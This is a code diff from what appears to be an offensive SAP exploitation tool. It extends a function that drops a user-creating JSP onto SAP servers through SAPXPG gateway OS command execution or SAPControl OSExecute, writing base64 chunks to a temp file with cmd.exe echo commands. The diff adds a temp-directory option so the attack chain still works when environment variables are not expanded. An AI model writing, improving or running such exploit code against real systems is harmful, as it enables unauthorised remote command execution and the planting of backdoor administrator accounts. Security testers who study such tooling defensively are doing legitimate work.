@@ -671,7 +671,8 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
 # ---------------------------------------------------------------------------
 
 def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
-                                    chunk_size: int = 100) -> dict:
+                                    chunk_size: int = 100,
+                                    tmp_dir: str = "") -> dict:
     """Drop the create-user JSP via SAPXPG gateway OS exec.
 
     Gateway SAPXPG has 128-byte EXTPROG / 255-byte PARAMS limits, so a
@@ -736,7 +737,17 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
         chunk_shell = "cmd.exe"
         decode_shell = "cmd.exe"
         cleanup_shell = "cmd.exe"
-        tmp_b64 = r"%TEMP%\sapmap_ume.b64"
+        # %TEMP% is fine when exec_fn routes through the SAP OS
+        # abstraction layer (SAPXPG on GW): the kernel expands it
+        # before the child sees it.  SAPControl OSExecute is a
+        # bare CreateProcess — no shell, no env expansion — so
+        # cmd.exe receives "%TEMP%\sapmap_ume.b64" as a literal
+        # path and fails with exit=2.  Caller supplies an absolute
+        # path (e.g. "C:\\Windows\\Temp") via ``tmp_dir`` to force
+        # the safer route.  Fall back to %TEMP% when unset so the
+        # GW path stays byte-identical.
+        _tmp_win = (tmp_dir.rstrip("\\/") if tmp_dir else "%TEMP%")
+        tmp_b64 = fr"{_tmp_win}\sapmap_ume.b64"
 
         def echo_args(chunk, op):
             return f"/C echo {chunk}{op}{tmp_b64}"
